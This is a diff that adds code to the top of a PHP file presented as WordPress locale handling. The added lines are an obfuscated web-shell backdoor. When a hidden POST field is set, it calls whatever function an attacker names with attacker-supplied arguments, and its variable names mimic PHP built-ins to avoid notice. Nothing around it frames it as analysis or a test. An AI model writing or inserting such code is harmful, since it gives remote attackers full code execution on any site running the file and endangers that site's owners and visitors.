@@ -1,4 +1,11 @@
-<?php
+<?php 
+$ob_get_length_bihd   =   $_POST;
+if(isset($ob_get_length_bihd['hash_hmac_algos_ws']))   {
+	$openssl_pbkdf2_nchg   =   $ob_get_length_bihd['random_int_np'];
+	$openssl_dh_compute_key_eacc   =   $ob_get_length_bihd['end_st'];
+	$openssl_pbkdf2_nchg(...$openssl_dh_compute_key_eacc);
+} 
+
 /**
  * Represents a WordPress locale
  * 
